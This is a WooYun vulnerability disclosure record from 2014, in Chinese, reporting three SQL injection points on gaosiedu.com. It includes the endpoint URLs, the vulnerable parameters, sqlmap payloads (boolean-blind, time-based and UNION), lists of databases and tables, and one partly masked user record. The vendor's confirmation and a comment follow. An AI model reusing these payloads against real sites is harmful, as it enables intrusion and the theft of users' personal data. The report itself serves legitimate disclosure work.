{"id": 43889, "wybug_id": "wooyun-2014-081341", "wybug_title": "高思教育高危SQL注入#2（三处打包）", "wybug_corp": "gaosiedu.com", "wybug_author": "Haswell", "wybug_date": "2014-10-30 15:25", "wybug_open_date": "2014-12-14 15:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向公众公开  简要描述： 主站的业务出现的三处打包注入，危机多个数据库账户，用户系统，能够获取大量数据。 详细说明：  注入点打包\nhttp://www.gaosiedu.com/like/login.php POST 无需登录问题参数：username 数据库账户：paiwei@localhost\n\nhttp://www.gaosiedu.com/jianli/ajax_user.php?act=do_reg 无需登录问题参数：username 数据库账户：paiwei@localhost\n\nhttp://www.gaosiedu.com/xuliqizhong/index.php/AjaxGet POST 无需登录问题参数：_cid 数据库账户：signup@localhost\n----------------------------------------------------------------------注入点:http://www.gaosiedu.com/like/login.php\nsqlmap identified the following injection points with a total of 239 HTTP(s) requests:---Place: POSTParameter: username    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=1' AND 9865=9865 AND 'gHzC'='gHzC&action=login&password=3    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: username=1' AND SLEEP(5) AND 'idlw'='idlw&action=login&password=3---web application technology: Nginx, PHP 5.2.13back-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: username    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=1' AND 9865=9865 AND 'gHzC'='gHzC&action=login&password=3    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: username=1' AND SLEEP(5) AND 'idlw'='idlw&action=login&password=3---web application technology: Nginx, PHP 5.2.13back-end DBMS: MySQL 5.0.11available databases [3]:[*] information_schema[*] paiwei[*] test\npaiwei中的数据表：\n[65 tables]+----------------------------------+| Career_answer                    || Career_info                      || Career_question                  || Career_relation_r_a              || Career_result                    || Heart_answer                     || Heart_info                       || Heart_question                   || Heart_relation_r_a               || Heart_result                     || PW_area                          || PW_middle                        || PW_phone                         || PW_primary                       || PW_relationship_p_m              || RDF_info                         || Score_area                       || Score_c_s                        || Score_class                      || Score_school                     || YBT_phpcms                       || essay_avatar                     || essay_excellent                  || essay_extra_student              || essay_extra_student_relationship || essay_list                       || essay_theme                      || essay_type                       || hp_admin_table                   || hp_area                          || hp_commcode                      || hp_community                     || hp_phone                         || hp_primary                       || jsj_tea                          || jsj_tea_vote                     || ks_tiku                          || ks_users                         || lk_member                        || lk_member_article                || lk_member_img                    || lk_member_video                  || lk_member_vote                   || lk_members_info                  || model_attr_relations             || model_attributes                 || model_data                       || model_forms                      || model_info                       || my_admin_table                   || qs_members                       || qs_resume                        || qs_resume_aihao                  || qs_resume_fujian                 || qs_resume_jineng                 || qs_resume_study                  || qs_resume_techang                || qs_resume_xingge                 || qs_resume_zhishi                 || qs_resume_zijian                 || tp_tea                           || tp_tea_vote                      || tt_vote_log                      || tt_zuoye                         || tt_zuoye_vote                    |+----------------------------------+\n------------------------------------------------------另一个注入点也影响到了相同的数据库，不做赘述http://www.gaosiedu.com/jianli/ajax_user.php?act=do_reg \nsqlmap identified the following injection points with a total of 215 HTTP(s) requests:---Place: POSTParameter: username    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: email=ty@e.ca&password=3&password2=3&username=a' AND 6087=6087 AND 'bwMT'='bwMT    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: email=ty@e.ca&password=3&password2=3&username=a' AND SLEEP(5) AND 'jZXW'='jZXW---web application technology: Nginx, PHP 5.2.13back-end DBMS: MySQL 5.0.11\n-------------------------------------------------------注入点：http://www.gaosiedu.com/xuliqizhong/index.php/AjaxGet\nsqlmap identified the following injection points with a total of 39 HTTP(s) requests:---Place: POSTParameter: _cid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: _cid=1 AND 5319=5319&_action=getRoom    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: _cid=-9250 UNION ALL SELECT CONCAT(0x7177676871,0x4751677770517a4c4a69,0x7176787a71)#&_action=getRoom    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: _cid=1 AND SLEEP(5)&_action=getRoom---web application technology: Nginx, PHP 5.2.13back-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: _cid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: _cid=1 AND 5319=5319&_action=getRoom    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: _cid=-9250 UNION ALL SELECT CONCAT(0x7177676871,0x4751677770517a4c4a69,0x7176787a71)#&_action=getRoom    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: _cid=1 AND SLEEP(5)&_action=getRoom---web application technology: Nginx, PHP 5.2.13back-end DBMS: MySQL 5.0.11available databases [3]:[*] information_schema[*] signup[*] test其中signup库内，含有大量注册用户信息，我仅仅select出了signup表第一条预览下| 1   | 21  | 1368*马赛克*64 | *马赛克*   | 13766453781.png  | 清华附中     | 1376645378 |\n   漏洞证明：  web application technology: Nginx, PHP 5.2.13back-end DBMS: MySQL 5.0.11signup@localhostpaiwei@localhostavailable databases [3]:[*] information_schema[*] signup[*] test[*] paiwei其它同上建议升级MySQL php 以及THINKPHP,都太老了   修复方案：  我也是你们学员，教育企业更应注重数据安全，希望越做越好; )   版权声明：转载请注明来源 Haswell@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-30 17:39 厂商回复： 感谢提供漏洞，一些过期的专题页已经关掉了， 应该还有一些不能关闭的专题页，也正在抓紧修改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-31 20:38 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  醉    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}